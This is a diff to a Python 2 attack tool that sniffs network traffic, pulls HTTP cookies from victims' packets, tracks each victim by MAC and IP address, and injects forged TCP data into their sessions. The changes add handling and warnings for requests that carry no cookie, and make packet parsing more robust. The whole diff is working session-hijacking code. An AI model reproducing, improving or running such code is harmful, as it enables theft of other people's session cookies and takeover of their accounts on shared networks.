@@ -160,12 +160,19 @@ class Victim:
 		for existing_cookie in self.cookies:
 			if (existing_cookie[0] == cookie[0]):
 				exists=1
-		if (not exists):
+		if (not exists and cookie[1]!="NONE"):
 			print "[+] New cookie detected for ",self.mac
 			print cookie
 			self.cookies.append(cookie)
+		else:
+			if (cookie[1]=="NONE"):
+				if (self.ip is not None):
+					print bcolors.WARNING+"[!] No cookie on client",self.ip," for website",cookie[0]
+				else:
+					print bcolors.WARNING+"[!] No cookie on client",self.mac," for website",cookie[0]
 
 	def add_cookie(self,cookie):
+#		print cookie
 		if (self.victim_parameters.websites is not None):
 			for website in self.victim_parameters.websites:
 				if (cookie[0] in website):
@@ -234,7 +241,10 @@ class PacketHandler:
 			if (len(host)!=0 and len(cookie)!=0):
 				return [host,cookie]
 			else:
-				return None
+				if (len(host)>0):
+					return (host,None)
+				else:
+					return None
 		else:
 			return None
 
@@ -273,9 +283,12 @@ class PacketHandler:
 		if (self.handler is not None):
 			self.handler(self,interface,pkt)
 		else:
-			vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie=self.handle_default(pkt)
+			try:
+				vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie=self.handle_default(pkt)
+			except:
+				return
 			if (len(self.victims)==0):
-				if (cookie is not None):
+				if (cookie[1] is not None):
 					exists=0
 					for victim in self.newvictims:
 						if (victim.ip is not None):
@@ -293,6 +306,18 @@ class PacketHandler:
 						v1.add_cookie(cookie)
 						self.newvictims.append(v1)
 				else:
+					if (cookie[0] is not None and cookie[1] is None):
+#						print bcolors.WARNING+"[!] No cookie found for",cookie[0]
+						newcookie=[cookie[0],"NONE"]
+						cookie=newcookie
+						for victim in self.newvictims:
+							if (victim.ip is not None):
+								if (victim.ip==vicip):
+									victim.add_cookie(cookie)
+							else:
+								if (victim.mac is not None):
+									if (victim.mac.lower()==vicmac.lower()):
+										victim.add_cookie(cookie)
 					exists=0
 					for victim in self.newvictims:
 						if (victim.ip is not None):
@@ -322,7 +347,7 @@ class PacketHandler:
 								if (injection is not None):
 									self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
 			else:
-				if (cookie is not None):
+				if (cookie[1] is not None):
 					for victim in self.victims:
 						if (victim.ip is not None):
 							if (victim.ip==vicip):
@@ -331,6 +356,20 @@ class PacketHandler:
 							if (victim.mac is not None):
 								if (victim.mac.lower()==vicmac.lower()):
 									victim.add_cookie(cookie)
+				else:
+					if (cookie[0] is not None and cookie[1] is None):
+						print bcolors.WARNING+"[!] Victim ",vicmac,"cookie not found for website",cookie[0]
+						newcookie=[cookie[0],"NONE"]
+						cookie=newcookie
+						for victim in self.victims:
+							if (victim.ip is not None):
+								if (victim.ip==vicip):
+									victim.add_cookie(cookie)
+							else:
+								if (victim.mac is not None):
+									if (victim.mac.lower()==vicmac.lower()):
+										victim.add_cookie(cookie)
+						
 				if (self.excluded is not None):
 					for host in self.excluded:
 						if (svrip in host):
